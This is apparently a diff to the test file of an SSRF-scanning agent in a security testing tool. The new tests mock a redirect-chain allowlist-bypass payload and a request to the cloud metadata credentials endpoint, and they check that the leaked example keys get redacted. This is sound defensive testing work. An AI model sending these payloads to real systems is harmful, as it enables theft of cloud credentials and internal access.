@@ -196,6 +196,12 @@ async def test_waf_block_then_bypass_records_waf_bypass(monkeypatch):
         "dast.agents.ssrf_agent.get_filtered_payloads",
         lambda *a, **k: ["http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/{{TOKEN}}"],
     )
+    # Isolate the original scenario: no redirect_chain group appended (5-B-2),
+    # so the issued-token sequence stays template → mutation.
+    monkeypatch.setattr(
+        "dast.agents.ssrf_agent.get_payloads",
+        lambda category, group: [],
+    )
 
     async def fake_send(client, method, url, headers, body):
         return _resp(403, "Request blocked by WAF")
@@ -244,3 +250,91 @@ async def test_body_location_injection_oob_callback(monkeypatch):
 
     assert len(findings) == 1
     assert findings[0].parameter == "webhook"
+
+
+# ── redirect-chain bypass + metadata impact (5-B-2) ──────────────────────────
+
+@pytest.mark.asyncio
+async def test_redirect_chain_follow_confirms_critical(monkeypatch):
+    """The 302 was FOLLOWED: the second-stage /follow/<token> request landed on
+    the collaborator → critical allowlist-bypass finding, bypass_validation."""
+    target = _target()
+    collaborator = _FakeCollaborator(hit_tokens=set())
+    monkeypatch.setattr(
+        "dast.agents.ssrf_agent.get_filtered_payloads",
+        lambda *a, **k: [],
+    )
+    # Only the follow-proving redirect template ({{TOKEN}} appears twice: the
+    # initial /redirect/<token> and the followed /follow/<token>).
+    monkeypatch.setattr(
+        "dast.agents.ssrf_agent.get_payloads",
+        lambda category, group: (
+            ["http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/redirect/{{TOKEN}}"
+             "?to=http%3A%2F%2F{{COLLAB_HOST}}%3A{{COLLAB_PORT}}%2Ffollow%2F{{TOKEN}}"]
+            if group == "redirect_chain" else []
+        ),
+    )
+
+    issued: list = []
+
+    def fake_issue():
+        issued.append(f"tok{len(issued) + 1}")
+        return issued[-1]
+
+    collaborator.issue_token = fake_issue  # type: ignore[method-assign]
+    collaborator._hit_tokens.add("follow/tok1")  # the fetch followed the 302
+
+    async def fake_send(client, method, url, headers, body):
+        return _resp(200, "fetched fine")
+
+    with patch("dast.agents.ssrf_agent._send", side_effect=fake_send):
+        findings = await SsrfAgent().run(target, MagicMock(), collaborator=collaborator)
+
+    assert len(findings) == 1
+    f = findings[0]
+    assert f.title == "SSRF via Redirect-Chain Allowlist Bypass"
+    assert f.severity == "critical" and f.confirmed is not False
+    assert f.bypass_validation is True
+    assert "follow/tok1" in f.evidence
+
+
+@pytest.mark.asyncio
+async def test_metadata_hit_attaches_redacted_impact(monkeypatch):
+    """In-band metadata signature → finding carries extracted_data with the
+    body capped and credential-shaped values redacted."""
+    target = _target()
+    collaborator = _FakeCollaborator(hit_tokens=set())
+    monkeypatch.setattr(
+        "dast.agents.ssrf_agent.get_filtered_payloads",
+        lambda *a, **k: ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+    )
+    monkeypatch.setattr(
+        "dast.agents.ssrf_agent.get_payloads",
+        lambda category, group: [],
+    )
+    monkeypatch.setattr(
+        "dast.agents.ssrf_agent.get_value",
+        lambda category, key, *a, **k: (
+            ["url"] if key == "url_param_keywords"
+            else (["AccessKeyId"] if key == "internal_response_signatures" else None)
+        ),
+    )
+    leak = (
+        '{"Code": "Success", "AccessKeyId": "AKIAIOSFODNN7EXAMPLE"}\n'
+        '"SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}'
+    )
+
+    async def fake_send(client, method, url, headers, body):
+        return _resp(200, leak)
+
+    with patch("dast.agents.ssrf_agent._send", side_effect=fake_send):
+        findings = await SsrfAgent().run(target, MagicMock(), collaborator=collaborator)
+
+    assert len(findings) == 1
+    f = findings[0]
+    assert f.extracted_data and "metadata_body" in f.extracted_data
+    body = f.extracted_data["metadata_body"]
+    assert len(body) <= 800
+    assert "wJalrXUtnFEMI/K7MDENG" not in body      # full secret gone
+    assert "[redacted]" in body                      # shape-preserved redaction
+    assert "AccessKeyId" in body                     # structure still readable
